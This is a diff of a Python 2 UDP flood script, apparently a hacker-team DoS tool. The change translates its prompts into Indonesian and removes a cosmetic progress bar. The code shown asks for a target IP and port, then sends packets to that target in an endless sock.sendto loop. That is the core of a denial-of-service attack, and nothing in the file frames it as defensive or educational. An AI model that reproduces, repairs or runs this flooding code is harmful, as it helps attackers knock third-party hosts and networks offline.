@@ -3,7 +3,7 @@ import os
 import time
 import socket
 import random
-#Code Time
+#Perlengkapan Temput :v
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -26,21 +26,11 @@ print "Github    : https://github.com/Anon6372098"
 print "Email     : anon6372098@gmail.com"
 print "Team.     : D4RK SYST3M F41LUR3 S33K3R (DSFS)"
 print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = raw_input("Masukkan IP Target : ")
+port = input("Masukkan Port      : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
+os.system("figlet Dimulai")
 sent = 0
 while True:
      sock.sendto(bytes, (ip, port))
